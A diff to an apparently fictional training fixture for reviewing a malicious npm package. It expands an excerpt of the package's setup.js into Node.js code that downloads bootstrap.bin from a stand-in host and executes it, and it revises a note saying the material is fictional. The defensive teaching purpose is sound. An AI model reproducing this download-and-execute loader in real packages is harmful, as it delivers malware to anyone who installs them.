@@ -39,7 +39,7 @@
       "name": "Package Source / 静的Review",
       "content": {
         "対象": "配布tarball内scripts/setup.js",
-        "抜粋": "const url = \"https://render-assets.example/bootstrap.bin\";\n// download(url) -> temporary executable\n// execute: <TRAINING-PLACEHOLDER>",
+        "抜粋": "const https = require(\"https\");\nconst fs = require(\"fs\");\nconst { execFile } = require(\"child_process\");\nconst url = \"https://render-assets.example/bootstrap.bin\";\nconst targetPath = 〔一時FileのPathを省略〕;\nhttps.get(url, response => {\n  const file = fs.createWriteStream(targetPath);\n  response.pipe(file);\n  file.on(\"finish\", () => {\n    file.close(() => execFile(targetPath, 〔引数を省略〕));\n  });\n});",
         "取得方法": "InstallせずArchive内のSourceを表示"
       }
     },
@@ -504,6 +504,6 @@
   "sources": [
     "https://docs.npmjs.com/cli/v11/configuring-npm/package-lock-json/"
   ],
-  "fixture_note": "組織・Domain・IP・Package・Hash・記録は架空の保存済み教材。IPは文書用アドレスで、RDAP・外部評判も実照会ではない。時刻は2026-08-18を基準とし、出力は必要なフィールドの抜粋。攻撃コマンドのPayloadは<TRAINING-PLACEHOLDER>に置換。 各問題は独立した端末・案件のSnapshot。PID・時刻の再利用は問題間の関連を意味しない。時刻はZ表記以外すべてJST。",
+  "fixture_note": "組織・Domain・IP・Package・Hash・記録は架空の保存済み教材。IPは文書用アドレスで、RDAP・外部評判も実照会ではない。時刻は2026-08-18を基準とし、出力は必要なフィールドの抜粋。Command・Sourceの〔…を省略〕は教材の編集箇所。実行可能なPayloadは配布しない。 各問題は独立した端末・案件のSnapshot。PID・時刻の再利用は問題間の関連を意味しない。時刻はZ表記以外すべてJST。",
   "ecosystem": "npm"
 }
